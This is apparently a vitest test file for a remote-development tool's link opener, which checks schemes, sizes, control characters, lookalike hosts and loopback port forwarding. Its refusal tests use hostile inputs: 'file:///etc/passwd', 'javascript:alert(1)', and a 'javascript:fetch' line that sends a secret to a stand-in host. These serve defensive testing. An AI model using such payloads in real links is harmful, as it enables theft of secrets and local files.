import { describe, expect, it } from 'vitest';
import { MAX_LINK_BYTES, MAX_PENDING_LINKS_PER_HOST, OpenUrl, type LinkAnswer, type LinkRequest } from '../open-url';
import { ForwardLimitError, PortRefusedError, type PortRefusal, type Tunnel, type TunnelTarget } from '../ports/tunnels';

const PROD = 'ssh+prod-1';
const STAGING = 'ssh+staging';

interface Forwarded {
  readonly authority: string;
  readonly remote: TunnelTarget;
  readonly options: { readonly localPort?: number; readonly requireLocalPort?: boolean } | undefined;
}

interface HarnessOptions {
  // every notice's answer; 'wait' leaves each notice up until the test answers it
  readonly answer?: LinkAnswer | 'wait';
  readonly switchOn?: readonly string[];
  readonly taken?: readonly number[];
  // local ports a forward that needs its exact port is refused with, as reserved-ports.ts refuses them
  readonly refusals?: Readonly<Record<number, PortRefusal>>;
  // what every forward fails with instead
  readonly forwardFails?: Error;
  readonly opens?: boolean;
}

interface Notice {
  readonly authority: string;
  readonly url: string;
  answer(value: LinkAnswer): void;
  withdrawn: boolean;
}

/**
 * OpenUrl over TunnelManager doubles: a forward takes the remote port locally unless it is in `taken`, else the next free
 * one; requireLocalPort refuses a taken port as TunnelManager does. Every answer, notice and open is recorded.
 */
function harness(options: HarnessOptions = {}) {
  const tunnels = new Map<string, Tunnel[]>();
  const forwarded: Forwarded[] = [];
  const asked: Array<{ authority: string; url: string }> = [];
  const notices: Notice[] = [];
  const opened: string[] = [];
  const warnings: string[] = [];
  const logged: string[] = [];
  const taken = new Set(options.taken ?? []);
  const changes: Array<(authority: string, localPorts: readonly number[]) => void> = [];
  // the forward on that local port stops, as Stop forwarding or a disconnect stops it
  const stop = (authority: string, localPort: number): void => {
    tunnels.set(authority, (tunnels.get(authority) ?? []).filter((tunnel) => tunnel.localPort !== localPort));
    for (const listener of changes) listener(authority, (tunnels.get(authority) ?? []).map((tunnel) => tunnel.localPort));
  };
  const openUrl = new OpenUrl({
    tunnels: (authority) => ({
      list: (listed) => {
        expect(listed).toBe(authority);
        return tunnels.get(authority) ?? [];
      },
      forward: async (forwardedAuthority, remote, forwardOptions) => {
        expect(forwardedAuthority).toBe(authority);
        forwarded.push({ authority, remote, options: forwardOptions });
        if (options.forwardFails) throw options.forwardFails;
        const existing = (tunnels.get(authority) ?? []).find((tunnel) => tunnel.remote.port === remote.port);
        if (existing) return existing;
        let localPort = forwardOptions?.localPort ?? remote.port;
        const refusal = options.refusals?.[localPort];
        if (refusal !== undefined && forwardOptions?.requireLocalPort === true) throw new PortRefusedError(refusal, localPort);
        if (taken.has(localPort)) {
          if (forwardOptions?.requireLocalPort === true) throw new PortRefusedError('inUse', localPort);
          while (taken.has(localPort)) localPort += 1;
        }
        taken.add(localPort);
        const tunnel: Tunnel = { authority, key: `${remote.host}:${remote.port}`, remote, localPort, localAddresses: ['127.0.0.1'], liveConnections: 0 };
        tunnels.set(authority, [...(tunnels.get(authority) ?? []), tunnel]);
        return tunnel;
      },
    }),
    onForwardsChanged: (listener) => {
      changes.push(listener);
      return { dispose: () => undefined };
    },
    opensTerminalLinks: (authority) => (options.switchOn ?? []).includes(authority),
    askToOpen: (request): LinkRequest => {
      asked.push(request);
      let answer!: (value: LinkAnswer) => void;
      const answered = new Promise<LinkAnswer>((resolve) => (answer = resolve));
      const notice: Notice = { ...request, answer, withdrawn: false };
      notices.push(notice);
      if (options.answer !== 'wait') answer(options.answer ?? 'open');
      return {
        answer: answered,
        withdraw: () => {
          notice.withdrawn = true;
          answer('dismissed');
        },
      };
    },
    openExternal: async (url) => {
      opened.push(url);
      return options.opens ?? true;
    },
    refusalText: (code, port) => ({ inUse: `Port ${port} is in use on this computer`, reserved: `Port ${port} is reserved for sign-ins on this computer`, privileged: 'Ports below 1024 need administrator rights on this computer', invalid: 'Enter a port from 1 to 65535' })[code],
    hostName: (authority) => (authority === PROD ? 'prod-1' : authority),
    warn: (message) => warnings.push(message),
    t: (message, ...args) => args.reduce((text, arg, index) => text.replace(`{${index}}`, arg), message),
    log: (line) => logged.push(line),
  });
  return { openUrl, tunnels, forwarded, asked, notices, opened, warnings, logged, stop };
}

const settle = (): Promise<void> => new Promise((resolve) => setImmediate(resolve));
const INVALID = 'Only http and https links of at most 8 KiB with no control characters open on this computer.';

describe('the links a target may open', () => {
  it('refuses every scheme but http and https, and text that is no URL, before forwarding or asking', async () => {
    for (const url of ['file:///etc/passwd', 'javascript:alert(1)', 'vscode://x', 'ftp://example.test/', 'mailto:a@example.test', 'not a url', '']) {
      const h = harness();
      await expect(h.openUrl.terminalBrowser(PROD, url), url).rejects.toMatchObject({ name: 'LinkRefusedError', code: 'invalid', message: INVALID });
      expect(h.forwarded).toEqual([]);
      expect(h.asked).toEqual([]);
      expect(h.opened).toEqual([]);
    }
  });

  it('opens a URL of exactly 8 KiB and refuses one byte more, counting UTF-8 bytes', async () => {
    const base = 'https://example.test/';
    const exact = harness({ switchOn: [PROD] });
    await exact.openUrl.terminalBrowser(PROD, base + 'a'.repeat(MAX_LINK_BYTES - base.length));
    expect(exact.opened).toHaveLength(1);
    const over = harness({ switchOn: [PROD] });
    await expect(over.openUrl.terminalBrowser(PROD, base + 'a'.repeat(MAX_LINK_BYTES - base.length + 1))).rejects.toMatchObject({ code: 'invalid' });
    // 4096 two-byte characters are 8 KiB and more once the scheme is counted
    await expect(over.openUrl.terminalBrowser(PROD, base + 'é'.repeat(MAX_LINK_BYTES / 2))).rejects.toMatchObject({ code: 'invalid' });
    expect(over.opened).toEqual([]);
  });

  it('refuses a control character the URL parser would silently drop or that could hide the address', async () => {
    for (const control of ['\n', '\r', '\t', '\0', '\x1b', '\x7f', '\x85', '\x9b']) {
      const h = harness({ switchOn: [PROD] });
      await expect(h.openUrl.terminalBrowser(PROD, `https://example.test/a${control}b`), JSON.stringify(control)).rejects.toMatchObject({ code: 'invalid' });
      expect(h.opened).toEqual([]);
    }
  });

  it('shows and opens the canonical href: a punycode host and a percent-encoded path', async () => {
    const h = harness();
    await h.openUrl.terminalBrowser(PROD, 'HTTPS://GitHub.com/login/device?x=ü');
    await settle();
    expect(h.asked).toEqual([{ authority: PROD, url: 'https://github.com/login/device?x=%C3%BC' }]);
    const lookalike = harness();
    await lookalike.openUrl.terminalBrowser(PROD, 'https://gіthub.com/');
    await settle();
    expect(lookalike.asked[0]!.url).toBe('https://xn--gthub-n2e.com/');
    expect(lookalike.opened).toEqual(['https://xn--gthub-n2e.com/']);
  });
});

describe('loopback ports', () => {
  it('forwards localhost, 127.0.0.1, 0.0.0.0 and [::1] with a port and opens the local port', async () => {
    const h = harness({ switchOn: [PROD], taken: [8123] });
    await h.openUrl.terminalBrowser(PROD, 'http://localhost:8123/cb?code=1#f');
    await h.openUrl.terminalBrowser(PROD, 'http://127.0.0.1:3000/');
    await h.openUrl.terminalBrowser(PROD, 'http://0.0.0.0:4000/');
    await h.openUrl.terminalBrowser(PROD, 'http://[::1]:5000/x');
    await h.openUrl.terminalBrowser(PROD, 'http://127.1:6000/');
    expect(h.forwarded.map(({ remote }) => remote.port)).toEqual([8123, 3000, 4000, 5000, 6000]);
    expect(h.opened).toEqual([
      'http://localhost:8124/cb?code=1#f',
      'http://127.0.0.1:3000/',
      // 0.0.0.0 is no address a browser should be sent to
      'http://localhost:4000/',
      'http://[::1]:5000/x',
      'http://127.0.0.1:6000/',
    ]);
  });

  it('forwards every form of the target\'s loopback the browser relay forwards, never opening this computer\'s unforwarded', async () => {
    const h = harness({ switchOn: [PROD] });
    await h.openUrl.terminalBrowser(PROD, 'http://app.localhost:5173/');
    await h.openUrl.terminalBrowser(PROD, 'http://127.0.0.2:3000/');
    await h.openUrl.terminalBrowser(PROD, 'http://[::]:4000/');
    await h.openUrl.terminalBrowser(PROD, 'https://example.test/?u=http://app.localhost:7000/');
    expect(h.forwarded.map(({ remote }) => remote.port)).toEqual([5173, 3000, 4000, 7000]);
    expect(h.opened).toEqual(['http://localhost:5173/', 'http://localhost:3000/', 'http://localhost:4000/', `https://example.test/?u=${encodeURIComponent('http://localhost:7000/')}`]);
  });

  it('forwards the scheme\'s default port of a loopback URL with no port or with that port written, and leaves another host as written', async () => {
    // the local listeners on 80 and 443 are taken, as a POSIX client's privileged ports are, so each moves to a free port
    const h = harness({ switchOn: [PROD], taken: [80, 443] });
    await h.openUrl.terminalBrowser(PROD, 'http://localhost/');
    await h.openUrl.terminalBrowser(PROD, 'https://127.0.0.1:443/a');
    await h.openUrl.terminalBrowser(PROD, 'http://[::1]:80/');
    await h.openUrl.terminalBrowser(PROD, 'https://example.test/?next=http://localhost/done');
    await h.openUrl.terminalBrowser(PROD, 'http://example.test:8080/');
    // the later links to port 80 reach the forward the first made
    expect(h.forwarded.map(({ remote }) => remote.port)).toEqual([80, 443]);
    expect(h.opened).toEqual([
      'http://localhost:81/',
      'https://127.0.0.1:444/a',
      'http://[::1]:81/',
      `https://example.test/?next=${encodeURIComponent('http://localhost:81/done')}`,
      'http://example.test:8080/',
    ]);
  });

  it('forwards a redirect_uri with no port on its scheme\'s default port, and tells why a privileged or reserved port cannot be used', async () => {
    const h = harness({ switchOn: [PROD], refusals: { 80: 'privileged', 8085: 'reserved' } });
    await expect(h.openUrl.terminalBrowser(PROD, 'https://a.example.test/auth?redirect_uri=http://localhost/cb')).rejects.toMatchObject({
      code: 'portRefused',
      message: 'Ports below 1024 need administrator rights on this computer',
    });
    expect(h.forwarded).toEqual([{ authority: PROD, remote: { host: 'localhost', port: 80 }, options: { localPort: 80, requireLocalPort: true } }]);
    await expect(h.openUrl.userClick(PROD, 'https://a.example.test/auth?redirect_uri=http://127.0.0.1:8085/cb')).resolves.toBe(false);
    expect(h.warnings).toEqual(['Port 8085 is reserved for sign-ins on this computer']);
    expect(h.opened).toEqual([]);
  });

  it('forwards a loopback URL inside a query value and rewrites that value alone, keeping every other pair byte for byte', async () => {
    const h = harness({ switchOn: [PROD], taken: [9000] });
    await h.openUrl.terminalBrowser(PROD, 'https://example.test/auth?a=x+y%2B&next=http%3A%2F%2Flocalhost%3A9000%2Fdone%3Fk%3D1&flag&b=%zz');
    expect(h.forwarded.map(({ remote, options }) => [remote.port, options])).toEqual([[9000, undefined]]);
    expect(h.opened).toEqual(['https://example.test/auth?a=x+y%2B&next=http%3A%2F%2Flocalhost%3A9001%2Fdone%3Fk%3D1&flag&b=%zz']);
  });

  it('forwards a [::1] URL inside a query value', async () => {
    const h = harness({ switchOn: [PROD], taken: [7000] });
    await h.openUrl.terminalBrowser(PROD, 'https://example.test/?u=http://[::1]:7000/');
    expect(h.opened).toEqual([`https://example.test/?u=${encodeURIComponent('http://[::1]:7001/')}`]);
  });

  it('keeps a redirect_uri as written and forwards its port to the same local port', async () => {
    const h = harness({ switchOn: [PROD] });
    const url = 'https://accounts.example.test/o/oauth2/auth?client_id=c&redirect_uri=http%3A%2F%2Flocalhost%3A8085%2Fcallback&state=s';
    await h.openUrl.terminalBrowser(PROD, url);
    expect(h.forwarded).toEqual([{ authority: PROD, remote: { host: 'localhost', port: 8085 }, options: { localPort: 8085, requireLocalPort: true } }]);
    expect(h.opened).toEqual([url]);
  });

  it('fails a redirect_uri whose local port is taken instead of rewriting it, and opens nothing', async () => {
    const h = harness({ switchOn: [PROD], taken: [8085] });
    const url = 'https://accounts.example.test/auth?redirect_uri=http://127.0.0.1:8085/callback';
    await expect(h.openUrl.terminalBrowser(PROD, url)).rejects.toMatchObject({ code: 'portInUse', message: 'Port 8085 is in use on this computer. Free it and try again.' });
    expect(h.opened).toEqual([]);
    expect(h.asked).toEqual([]);
  });

  it('fails a redirect_uri whose remote port already forwards to another local port', async () => {
    const h = harness({ switchOn: [PROD], taken: [8085] });
    await h.openUrl.terminalBrowser(PROD, 'http://localhost:8085/');
    expect(h.opened).toEqual(['http://localhost:8086/']);
    await expect(h.openUrl.terminalBrowser(PROD, 'https://a.example.test/?redirect_uri=http://localhost:8085/cb')).rejects.toMatchObject({ code: 'portInUse' });
    expect(h.opened).toHaveLength(1);
  });

  it('forwards through the tunnels of the authority the link came from', async () => {
    const h = harness({ switchOn: [PROD, STAGING] });
    await h.openUrl.terminalBrowser(STAGING, 'http://localhost:5173/');
    expect(h.forwarded.map(({ authority }) => authority)).toEqual([STAGING]);
    expect(h.tunnels.get(PROD)).toBeUndefined();
  });
});

describe('who asks first', () => {
  it('a terminal\'s BROWSER shows the notice with the host\'s name and the URL that opens, and Open opens it', async () => {
    const h = harness({ taken: [8123] });
    await h.openUrl.terminalBrowser(PROD, 'http://localhost:8123/cb');
    await settle();
    expect(h.asked).toEqual([{ authority: PROD, url: 'http://localhost:8124/cb' }]);
    expect(h.opened).toEqual(['http://localhost:8124/cb']);
  });

  it('a dismissed notice opens nothing', async () => {
    const h = harness({ answer: 'dismissed' });
    await h.openUrl.terminalBrowser(PROD, 'https://github.com/login/device');
    await settle();
    expect(h.asked).toHaveLength(1);
    expect(h.opened).toEqual([]);
  });

  it('a terminal\'s BROWSER answers before the notice does, so the program that asked is not held', async () => {
    let answer!: (value: LinkAnswer) => void;
    const h = harness();
    const pending = new OpenUrl({
      tunnels: () => ({ list: () => [], forward: async () => { throw new Error('no forward'); } }),
      onForwardsChanged: () => ({ dispose: () => undefined }),
      opensTerminalLinks: () => false,
      askToOpen: () => ({ answer: new Promise((resolve) => (answer = resolve)), withdraw: () => undefined }),
      openExternal: async (url) => {
        h.opened.push(url);
        return true;
      },
      refusalText: () => '',
      hostName: (authority) => authority,
      warn: () => undefined,
      t: (message) => message,
      log: () => undefined,
    });
    await pending.terminalBrowser(PROD, 'https://github.com/login/device');
    expect(h.opened).toEqual([]);
    answer('open');
    await settle();
    expect(h.opened).toEqual(['https://github.com/login/device']);
  });

  it('the host\'s switch opens its terminals\' links with no notice, and only that host\'s', async () => {
    const h = harness({ switchOn: [PROD] });
    await h.openUrl.terminalBrowser(PROD, 'https://example.test/login');
    expect(h.asked).toEqual([]);
    expect(h.opened).toEqual(['https://example.test/login']);
    await h.openUrl.terminalBrowser(STAGING, 'https://example.test/other');
    await settle();
    expect(h.asked).toEqual([{ authority: STAGING, url: 'https://example.test/other' }]);
  });

  it('a remote core\'s own openExternal always asks, even with the host\'s switch on', async () => {
    const h = harness({ switchOn: [PROD] });
    await expect(h.openUrl.coreOpenExternal(PROD, 'https://example.test/agent')).resolves.toBe(true);
    expect(h.asked).toEqual([{ authority: PROD, url: 'https://example.test/agent' }]);
    const dismissed = harness({ switchOn: [PROD], answer: 'dismissed' });
    await expect(dismissed.openUrl.coreOpenExternal(PROD, 'https://example.test/agent')).resolves.toBe(false);
    expect(dismissed.opened).toEqual([]);
  });

  it('a remote core\'s refused link answers false with a warning, and asks nothing', async () => {
    const h = harness();
    await expect(h.openUrl.coreOpenExternal(PROD, 'file:///etc/passwd')).resolves.toBe(false);
    expect(h.warnings).toEqual([INVALID]);
    expect(h.asked).toEqual([]);
  });

  it('a link clicked in a remote terminal or chat page opens with no notice, its loopback port forwarded first', async () => {
    const h = harness({ taken: [5173] });
    await expect(h.openUrl.userClick(PROD, 'http://localhost:5173/')).resolves.toBe(true);
    await expect(h.openUrl.userClick(PROD, 'https://example.test/docs')).resolves.toBe(true);
    expect(h.asked).toEqual([]);
    expect(h.opened).toEqual(['http://localhost:5174/', 'https://example.test/docs']);
  });

  it('a clicked link is checked like any other, and a refusal is a warning', async () => {
    const h = harness({ taken: [8085] });
    await expect(h.openUrl.userClick(PROD, 'javascript:alert(1)')).resolves.toBe(false);
    await expect(h.openUrl.userClick(PROD, 'https://a.example.test/?redirect_uri=http://localhost:8085/')).resolves.toBe(false);
    expect(h.opened).toEqual([]);
    expect(h.warnings).toEqual([INVALID, 'Port 8085 is in use on this computer. Free it and try again.']);
  });

  it('a browser that does not open is reported: to the program for BROWSER, as a warning for a click', async () => {
    const h = harness({ switchOn: [PROD], opens: false });
    await expect(h.openUrl.terminalBrowser(PROD, 'https://example.test/')).rejects.toMatchObject({ code: 'openFailed' });
    await expect(h.openUrl.userClick(PROD, 'https://example.test/')).resolves.toBe(false);
    expect(h.warnings).toEqual(['Damocles could not open the page in the system browser.']);
  });
});

describe('a link whose forward fails', () => {
  it('tells the user who clicked it, and the program that asked, instead of doing nothing', async () => {
    const lost = harness({ forwardFails: new Error('prod-1 is not connected') });
    await expect(lost.openUrl.userClick(PROD, 'http://localhost:5173/')).resolves.toBe(false);
    expect(lost.warnings).toEqual(['Port 5173 of prod-1 could not be forwarded to this computer, so the link did not open.']);
    expect(lost.logged.some((line) => line.includes('prod-1 is not connected'))).toBe(true);
    await expect(lost.openUrl.terminalBrowser(PROD, 'https://example.test/?u=http://localhost:7000/')).rejects.toMatchObject({ code: 'forwardFailed' });
    const full = harness({ forwardFails: new ForwardLimitError(PROD) });
    await expect(full.openUrl.userClick(PROD, 'http://127.0.0.1:3000/')).resolves.toBe(false);
    expect(full.warnings).toEqual(['prod-1 already has 256 forwarded ports, the most Damocles keeps for one host. Stop forwarding one to forward another.']);
    expect(full.opened).toEqual([]);
  });
});

describe('waiting link notices', () => {
  it('holds at most MAX_PENDING_LINKS_PER_HOST notices of one host, refusing the rest before forwarding, and takes more once one is answered', async () => {
    const h = harness({ answer: 'wait' });
    for (let i = 0; i < MAX_PENDING_LINKS_PER_HOST; i++) await h.openUrl.terminalBrowser(PROD, `http://localhost:${5000 + i}/`);
    await settle();
    expect(h.notices).toHaveLength(MAX_PENDING_LINKS_PER_HOST);
    await expect(h.openUrl.terminalBrowser(PROD, 'http://localhost:6000/')).rejects.toMatchObject({
      code: 'tooMany',
      message: `prod-1 already has ${MAX_PENDING_LINKS_PER_HOST} links waiting for an answer. Answer one to open another.`,
    });
    // a remote core's request past them is logged, never a warning toast of its own
    await expect(h.openUrl.coreOpenExternal(PROD, 'https://example.test/agent')).resolves.toBe(false);
    expect(h.warnings).toEqual([]);
    expect(h.forwarded.map(({ remote }) => remote.port)).not.toContain(6000);
    // another host's links are its own
    await h.openUrl.terminalBrowser(STAGING, 'https://example.test/staging');
    await settle();
    expect(h.notices).toHaveLength(MAX_PENDING_LINKS_PER_HOST + 1);
    h.notices[0]!.answer('dismissed');
    await settle();
    await h.openUrl.terminalBrowser(PROD, 'http://localhost:6000/');
    await settle();
    expect(h.notices).toHaveLength(MAX_PENDING_LINKS_PER_HOST + 2);
  });

  it('gives a place back when a link is refused before its notice shows', async () => {
    const h = harness({ answer: 'wait' });
    for (let i = 0; i < MAX_PENDING_LINKS_PER_HOST; i++) {
      await expect(h.openUrl.coreOpenExternal(PROD, 'javascript:alert(1)')).resolves.toBe(false);
      await expect(h.openUrl.terminalBrowser(PROD, 'file:///etc/passwd')).rejects.toMatchObject({ code: 'invalid' });
    }
    await h.openUrl.terminalBrowser(PROD, 'https://example.test/');
    await settle();
    expect(h.notices).toHaveLength(1);
  });

  it('withdraws a waiting notice once the forward its link reaches stops, and keeps the others', async () => {
    const h = harness({ answer: 'wait' });
    await h.openUrl.terminalBrowser(PROD, 'http://localhost:5173/');
    await h.openUrl.terminalBrowser(PROD, 'https://example.test/?redirect_uri=http://localhost:8085/cb');
    await h.openUrl.terminalBrowser(PROD, 'https://example.test/plain');
    await settle();
    h.stop(PROD, 8085);
    await settle();
    expect(h.notices.map((notice) => notice.withdrawn)).toEqual([false, true, false]);
    h.stop(PROD, 5173);
    expect(h.notices.map((notice) => notice.withdrawn)).toEqual([true, true, false]);
    expect(h.opened).toEqual([]);
  });

  it('withdraws every waiting notice of a host it forgets, and only that host\'s', async () => {
    const h = harness({ answer: 'wait' });
    await h.openUrl.terminalBrowser(PROD, 'https://example.test/a');
    await h.openUrl.terminalBrowser(STAGING, 'https://example.test/b');
    const core = h.openUrl.coreOpenExternal(PROD, 'https://example.test/c');
    await settle();
    h.openUrl.forgetHost(PROD);
    await expect(core).resolves.toBe(false);
    expect(h.notices.map((notice) => [notice.url, notice.withdrawn])).toEqual([['https://example.test/a', true], ['https://example.test/b', false], ['https://example.test/c', true]]);
    expect(h.opened).toEqual([]);
  });
});

describe('the log of a refused link', () => {
  it('names the scheme and origin only, never a path, query or fragment that can carry a token', async () => {
    const h = harness();
    await expect(h.openUrl.terminalBrowser(PROD, 'https://example.test/cb\x1b?token=secret-1#k=secret-2')).rejects.toMatchObject({ code: 'invalid' });
    await expect(h.openUrl.terminalBrowser(PROD, 'javascript:fetch("https://evil.test/?k=secret-3")')).rejects.toMatchObject({ code: 'invalid' });
    await expect(h.openUrl.terminalBrowser(PROD, 'not a url secret-4')).rejects.toMatchObject({ code: 'invalid' });
    expect(h.logged).toHaveLength(3);
    expect(h.logged[0]).toContain('https: https://example.test');
    expect(h.logged[1]).toContain('javascript: null');
    expect(h.logged.join('\n')).not.toMatch(/secret|token|evil/);
  });
});
